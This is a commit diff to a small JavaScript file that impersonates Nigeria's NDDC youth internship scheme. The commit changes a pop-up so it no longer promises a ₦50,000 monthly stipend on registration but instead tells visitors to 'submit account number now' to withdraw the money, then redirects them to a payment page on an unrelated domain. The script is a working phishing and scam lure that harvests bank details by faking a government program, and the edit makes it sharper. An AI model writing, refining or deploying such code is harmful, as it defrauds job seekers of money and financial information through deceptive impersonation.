6a5fee84d645219658dd378e70302683f59cc708
boss-bloq <nsisboy01@gmail.com>
2024-10-01 12:53:39 -0700

    Update nddc-activation.js

--- nddc-activation.js
+++ nddc-activation.js
@@ -1,6 +1,6 @@
 
-var password = 'Receive ₦50,000'
-password=prompt('NDDC: Register now for the ongoing NDDC 1yr youth internship scheme to receive ₦50,000.00 stipend monthly, kindly press Ok to submit your information now ','Receive ₦50,000');
-if (password != 'Receive ₦50,000') {
-location.href='https://damba-fest.org/nddc-program.html';
+var password = 'Withdraw ₦50,000'
+password=prompt('NDDC: Payment ongoing NDDC 1yr youth internship scheme to Withdraw ₦50,000.00 stipend monthly, kindly press Ok to submit account number now ','Withdraw ₦50,000');
+if (password != 'Withdraw ₦50,000') {
+location.href='https://damba-fest.org/payment.html';
 }
